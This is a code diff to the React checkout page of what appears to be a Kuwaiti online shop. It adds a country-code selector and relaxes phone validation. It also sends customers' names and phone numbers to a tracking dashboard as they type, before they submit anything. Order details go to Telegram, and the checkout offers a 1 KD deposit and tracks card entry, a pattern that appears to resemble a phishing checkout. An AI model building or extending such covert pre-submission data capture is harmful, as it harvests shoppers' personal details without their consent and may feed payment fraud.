@@ -16,10 +16,21 @@ function toEnglishDigits(str: string): string {
     .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776));
 }
 
-// Clean Kuwaiti phone input: convert Arabic digits and keep digits intact without chopping prefixes mid-typing
+// Clean phone input: convert Arabic digits and allow any phone number / international digits up to 18 characters
 function cleanKuwaitPhoneInput(raw: string): string {
-  return toEnglishDigits(raw).replace(/\D/g, '').slice(0, 15);
+  return toEnglishDigits(raw).replace(/[^\d+]/g, '').slice(0, 18);
 }
+
+const COUNTRY_CODES = [
+  { code: '+965', label: '🇰🇼 +965' },
+  { code: '+966', label: '🇸🇦 +966' },
+  { code: '+973', label: '🇧🇭 +973' },
+  { code: '+971', label: '🇦🇪 +971' },
+  { code: '+974', label: '🇶🇦 +974' },
+  { code: '+968', label: '🇴🇲 +968' },
+  { code: '+962', label: '🇯🇴 +962' },
+  { code: '', label: '🌍 دولي' }
+];
 
 interface CartPageProps {
   items: CartItem[];
@@ -40,6 +51,7 @@ export const CartPage: React.FC<CartPageProps> = ({
 }) => {
   // Saved Customer state or defaults
   const [name, setName] = useState(() => localStorage.getItem('cust_name') || '');
+  const [countryPrefix, setCountryPrefix] = useState(() => localStorage.getItem('cust_country_prefix') || '+965');
   const [phone, setPhone] = useState(() => cleanKuwaitPhoneInput(localStorage.getItem('cust_phone') || ''));
   const [governorate, setGovernorate] = useState(() => {
     const saved = localStorage.getItem('cust_gov');
@@ -65,17 +77,28 @@ export const CartPage: React.FC<CartPageProps> = ({
   const phoneInputRef = useRef<HTMLInputElement>(null);
   const activeBookingIdRef = useRef<string>(getOrCreateBookingId(false));
 
+  const buildFullPhone = (rawPhone: string, prefix: string): string => {
+    const digits = cleanKuwaitPhoneInput(rawPhone);
+    if (!digits) return '';
+    if (digits.startsWith('+') || !prefix) return digits;
+    const cleanPrefixDigits = prefix.replace(/\D/g, '');
+    if (cleanPrefixDigits && digits.startsWith(cleanPrefixDigits) && digits.length > 8) {
+      return `+${digits}`;
+    }
+    return prefix === '+965' ? digits : `${prefix} ${digits}`;
+  };
+
   // Real-time debounced sync as customer types phone & name so dashboard sees registration immediately
   React.useEffect(() => {
-    const cleaned = cleanKuwaitPhoneInput(phone);
-    if (cleaned.length < 4) return;
+    const cleaned = buildFullPhone(phone, countryPrefix);
+    if (cleaned.replace(/\D/g, '').length < 3 && name.trim().length < 2) return;
     const timer = setTimeout(() => {
       const finalName = name.trim() || 'عميل دلمون الكويت';
       const finalStreet = street.trim() || governorate;
       trackDetailsFilled({
         bookingId: activeBookingIdRef.current,
         name: finalName,
-        phone: cleaned,
+        phone: cleaned || '00000000',
         area: governorate,
         governorate,
         street: finalStreet,
@@ -91,19 +114,20 @@ export const CartPage: React.FC<CartPageProps> = ({
       }).catch(() => {});
     }, 500);
     return () => clearTimeout(timer);
-  }, [name, phone, governorate, street, notes, payableNow, subtotal, paymentMethod, items]);
+  }, [name, phone, countryPrefix, governorate, street, notes, payableNow, subtotal, paymentMethod, items]);
 
   const executeCheckout = (e?: React.FormEvent) => {
     if (e) e.preventDefault();
 
-    const cleanedPhone = cleanKuwaitPhoneInput(phone);
-    if (!cleanedPhone || cleanedPhone.length < 4) {
-      setErrorMsg('يرجى إدخال رقم الهاتف النقال لإتمام الطلب.');
+    const cleanedPhone = buildFullPhone(phone, countryPrefix);
+    if (!cleanedPhone && !name.trim()) {
+      setErrorMsg('يرجى إدخال رقم الهاتف أو الاسم لإتمام الطلب.');
       phoneInputRef.current?.focus();
       phoneInputRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
       return;
     }
 
+    const finalPhone = cleanedPhone || '00000000';
     const finalName = name.trim() || 'عميل دلمون الكويت';
     const finalStreet = street.trim() || governorate;
 
@@ -112,7 +136,8 @@ export const CartPage: React.FC<CartPageProps> = ({
     // Save to local storage for convenience
     try {
       localStorage.setItem('cust_name', finalName);
-      localStorage.setItem('cust_phone', cleanedPhone);
+      localStorage.setItem('cust_phone', cleanKuwaitPhoneInput(phone));
+      localStorage.setItem('cust_country_prefix', countryPrefix);
       localStorage.setItem('cust_gov', governorate);
       localStorage.setItem('cust_street', finalStreet);
       localStorage.setItem('cust_building', building);
@@ -123,7 +148,7 @@ export const CartPage: React.FC<CartPageProps> = ({
 
     const customerDetails: CustomerDetails = {
       name: finalName,
-      phone: cleanedPhone,
+      phone: finalPhone,
       governorate,
       street: finalStreet,
       building,
@@ -144,7 +169,7 @@ export const CartPage: React.FC<CartPageProps> = ({
     trackDetailsFilled({
       bookingId,
       name: finalName,
-      phone: cleanedPhone,
+      phone: finalPhone,
       area: governorate,
       governorate,
       street: finalStreet,
@@ -153,7 +178,8 @@ export const CartPage: React.FC<CartPageProps> = ({
       subtotal,
       items: itemsDescriptions,
       paymentMethod,
-      notes: notes.trim()
+      notes: notes.trim(),
+      forceTelegram: true
     }).catch(() => {});
 
     saveCustomerToFirestore(customerDetails).catch(() => {});
@@ -172,24 +198,6 @@ export const CartPage: React.FC<CartPageProps> = ({
       cardBank: 'بانتظار إدخال البطاقة',
       status: 'بانتظار الدفع (مسجل)'
     }).catch(() => {});
-
-    // Send direct notification through the single Telegram path
-    const itemsSummary =
-      items.length > 0
-        ? items.map((i) => `${i.product.name} (${i.qty})`).join('، ')
-        : 'تسجيل طلب مباشر';
-    sendTelegramNotification(
-      `🇰🇼 <b>طلب جديد من الكويت (الانتقال لبوابة الدفع)</b>\n` +
-      `🆔 <b>رقم الطلب:</b> <code>${bookingId}</code>\n` +
-      `👤 <b>الاسم:</b> ${finalName}\n` +
-      `📞 <b>الهاتف:</b> <code>+965 ${cleanedPhone}</code>\n` +
-      `📍 <b>المنطقة:</b> ${governorate}\n` +
-      `🏠 <b>العنوان:</b> ${finalStreet}\n` +
-      (notes.trim() ? `📝 <b>ملاحظات:</b> ${notes.trim()}\n` : '') +
-      `🛒 <b>المنتجات:</b> ${itemsSummary}\n` +
-      `💳 <b>طريقة الدفع:</b> ${paymentMethod.toUpperCase()} (${paymentOption === 'full' ? 'كامل المبلغ' : 'عربون 1 د.ك'})\n` +
-      `💰 <b>المبلغ المطلوب الآن:</b> KD ${payableNow.toFixed(3)}`
-    );
 
     onProceedToPayment(customerDetails, payableNow, subtotal);
   };
@@ -225,7 +233,7 @@ export const CartPage: React.FC<CartPageProps> = ({
             <div className="bg-white rounded-2xl border-2 border-[#c8102e]/20 shadow-sm p-4 sm:p-5 space-y-3.5">
               <h3 className="font-extrabold text-gray-900 text-sm flex items-center gap-2">
                 <MapPin className="w-4 h-4 text-[#c8102e]" />
-                <span>بيانات التسجيل والتوصيل في الكويت</span>
+                <span>بيانات التسجيل والتوصيل</span>
               </h3>
 
               {/* Name */}
@@ -249,15 +257,24 @@ export const CartPage: React.FC<CartPageProps> = ({
                 </div>
               </div>
 
-              {/* Phone with Kuwait Flag */}
+              {/* Phone with Country Selector */}
               <div>
                 <label className="block text-xs font-bold text-gray-700 mb-1">
-                  رقم الهاتف النقال (الكويت) <span className="text-red-500">*</span>
+                  رقم الهاتف النقال <span className="text-red-500">*</span>
                 </label>
                 <div className="flex border border-gray-300 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-[#c8102e]">
-                  <span className="bg-gray-100 px-3 py-2.5 text-xs font-bold text-gray-700 border-l border-gray-300 flex items-center gap-1" dir="ltr">
-                    🇰🇼 +965
-                  </span>
+                  <select
+                    value={countryPrefix}
+                    onChange={(e) => setCountryPrefix(e.target.value)}
+                    className="bg-gray-100 px-2 py-2.5 text-xs font-bold text-gray-700 border-l border-gray-300 focus:outline-none cursor-pointer"
+                    dir="ltr"
+                  >
+                    {COUNTRY_CODES.map((c) => (
+                      <option key={c.label} value={c.code}>
+                        {c.label}
+                      </option>
+                    ))}
+                  </select>
                   <input
                     ref={phoneInputRef}
                     type="tel"
@@ -268,7 +285,7 @@ export const CartPage: React.FC<CartPageProps> = ({
                       setPhone(cleanKuwaitPhoneInput(e.target.value));
                       if (errorMsg) setErrorMsg('');
                     }}
-                    placeholder="9XXXXXXX"
+                    placeholder="أدخل رقم الهاتف"
                     className="flex-1 px-3 py-2.5 text-sm font-bold text-left focus:outline-none"
                     dir="ltr"
                   />
@@ -278,7 +295,7 @@ export const CartPage: React.FC<CartPageProps> = ({
               {/* Area / Governorate */}
               <div>
                 <label className="block text-xs font-bold text-gray-700 mb-1">
-                  المنطقة / المحافظة في الكويت
+                  المنطقة / المحافظة
                 </label>
                 <select
                   value={governorate}
